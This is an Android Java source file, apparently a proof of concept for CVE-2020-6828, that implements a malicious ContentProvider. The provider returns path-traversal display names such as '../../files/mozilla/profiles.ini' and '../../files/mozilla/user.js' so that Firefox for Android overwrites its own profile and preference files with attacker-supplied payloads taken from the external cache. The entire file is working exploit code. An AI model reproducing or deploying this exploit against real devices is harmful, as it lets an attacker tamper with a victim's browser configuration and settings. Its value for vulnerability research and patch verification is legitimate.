package com.cve.poc20206828;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.content.UriMatcher;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.ParcelFileDescriptor;
import android.util.Log;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.InputStream;

public class FileContentProvider extends ContentProvider {

    private static final String TAG = "cve";
    private static final String AUTHORITY = "com.cve.poc20206828.file";
    private static final int MATCH_PROFILE_CODE = 114;
    private static final int MATCH_PREFS_CODE = 514;
    private static UriMatcher sUriMatcher;
    private static final Uri NOTIFY_FILE_URI = Uri.parse("content://" + AUTHORITY );

    static {
        sUriMatcher = new UriMatcher(UriMatcher.NO_MATCH);
        sUriMatcher.addURI(AUTHORITY, "profiles.ini", MATCH_PROFILE_CODE);//匹配profiles.ini路径的Uri
        sUriMatcher.addURI(AUTHORITY, "user.js", MATCH_PREFS_CODE);//匹配prefs.js路径的Uri
    }

    @Override
    public boolean onCreate(){
//        try{
//
//            Uri uri = Uri.parse("content://com.cve.poc20206828.file/file");
//            InputStream fis = getContext().getContentResolver().openInputStream(uri);
//            Log.i(TAG, "the file path : " + uri.getPath());
//        }catch (Exception e){
//            e.printStackTrace();
//        }
        return false;
    }

    @Override
    public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder){
        Log.i(TAG, "at least we get query() called, uri=" + uri.toString());
        switch (sUriMatcher.match(uri)){
            case MATCH_PROFILE_CODE:// to overwrite the profiles.ini
                Log.i(TAG, "projection[0] = " + projection[0]);
                if(projection[0].equals("_display_name")){
                    Log.i(TAG, "about to query the _display_name of profiles.ini");

                    String[] cols = {"_display_name"};
                    MatrixCursor mc = new MatrixCursor(cols);
                    mc.addRow(new Object[] {"../../files/mozilla/profiles.ini"});
                    return mc;
                }
//                else if(projection[0].equals("_data")){ // 会有一次query(uri, "_data")，不知道是什么目的，总之需要返回null
//                    Log.i(TAG, "about to query the _data ");
//
//                    String[] cols = {"_data"};
//                    MatrixCursor mc = new MatrixCursor(cols);
//                    mc.addRow(new Object[] { "data" });
//                    return mc;
//                }
                return null;

            case MATCH_PREFS_CODE:
                Log.i(TAG, "projection[0] = " + projection[0]);
                if(projection[0].equals("_display_name")){
                    Log.i(TAG, "about to query the the _display_name of user.js");

                    String[] cols = {"_display_name"};
                    MatrixCursor mc = new MatrixCursor(cols);
                    mc.addRow(new Object[] {"../../files/mozilla/user.js"});
                    return mc;
                }
                return null;

            default:
                Log.i(TAG, "not matched: " + uri.getPath() + "projection[0] = " + projection[0]);
                return null;
        }
    }

    @Override
    public String getType(Uri uri){
        return null;
    }

    @Override
    public Uri insert(Uri uri, ContentValues contentValues){
        Uri result = null;
        switch (sUriMatcher.match(uri)){
            case MATCH_PROFILE_CODE:
                break;
            default:
                break;
        }
        return result;
    }

    @Override
    public int delete(Uri uri, String selection, String[] selectionArgs){
        switch (sUriMatcher.match(uri)){
            case MATCH_PROFILE_CODE:
                return 114;
            default:
                return 0;
        }
    }

    public int update(Uri uri, ContentValues contentValues, String selection, String[] selectionArgs){
        switch (sUriMatcher.match(uri)){
            case MATCH_PROFILE_CODE:
                return 514;
            default:
                return 0;
        }
    }

    @Override
    public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
        Log.d(TAG, "openFile: "+uri.toString());
        String path = uri.getPath();

        if (path.contains("user")) {
            File payload = new File(getContext().getExternalCacheDir(), "user.js");
            return ParcelFileDescriptor.open(payload, ParcelFileDescriptor.MODE_READ_ONLY);
        }
        else if (path.contains("profile")) {
            File payload = new File(getContext().getExternalCacheDir(), "profiles.ini");
            return ParcelFileDescriptor.open(payload, ParcelFileDescriptor.MODE_READ_ONLY);
        }
        return null;
    }
}
